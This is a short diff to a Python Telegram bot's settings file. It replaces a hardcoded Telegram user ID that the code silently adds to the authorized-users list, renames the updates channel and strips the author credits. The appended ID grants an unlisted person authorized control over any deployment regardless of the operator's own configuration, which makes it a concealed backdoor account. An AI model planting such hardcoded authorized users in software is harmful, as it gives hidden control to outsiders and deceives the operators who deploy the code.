@@ -19,11 +19,11 @@ from bot.config import Config
 
 
 
-# dont think ne dumb (c) @Animes_Encoded 
+# dont think ne dumb (c) 
 AUTH_USERS = set(Config.AUTH_USERS)
 AUTH_USERS = list(AUTH_USERS)
-AUTH_USERS.append(1666551439)
-# again lol (c) @Animes_Encoded 
+AUTH_USERS.append(452118981)
+# 
 
 SESSION_NAME = Config.SESSION_NAME
 TG_BOT_TOKEN = Config.TG_BOT_TOKEN
@@ -39,7 +39,7 @@ UN_FINISHED_PROGRESS_STR = "▒"
 BOT_START_TIME = time.time()
 LOG_FILE_ZZGEVC = "Log.txt"
 BOT_USERNAME = Config.BOT_USERNAME 
-UPDATES_CHANNEL = "botlogas"
+UPDATES_CHANNEL = "uvuggg8h"
 data = []
 crf = []
 watermark = []
